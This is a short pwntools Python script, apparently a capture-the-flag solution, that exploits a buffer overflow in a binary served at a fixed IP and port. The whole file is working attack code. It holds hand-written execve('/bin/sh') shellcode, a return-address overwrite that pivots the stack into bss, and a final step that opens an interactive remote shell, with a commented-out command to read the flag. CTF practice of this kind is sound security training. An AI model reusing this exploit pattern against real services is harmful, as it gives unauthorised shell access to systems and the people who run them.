#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './name'
LIBC = ''
HOST = '140.110.112.77'
PORT = 2114

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )


"""
xor    rdx,rdx
xor    rsi,rsi
mov    rdi,0x6010c0
mov    al,0x3b
syscall
"""
sc = b"\x48\x31\xD2\x48\x31\xF6\x48\xC7\xC7\xC0\x10\x60\x00\xB0\x3B\x0F\x05"
sc_addr = 0x601f00
log.info(f"sc start from: {hex(sc_addr-0x10)}")

r.sendafter('ONLY contains', b'A')
r.sendafter('Leave some messege for me', b'B'*0x10 + p64(sc_addr) + p64(0x400881)) # migrate bss
r.sendafter('ONLY contains', b'/bin/sh')
r.sendafter('Leave some messege for me', sc.ljust(0x18, b'\x00') + p64(sc_addr-0x10))

#r.sendline('cat /home/`whoami`/flag')
r.interactive()
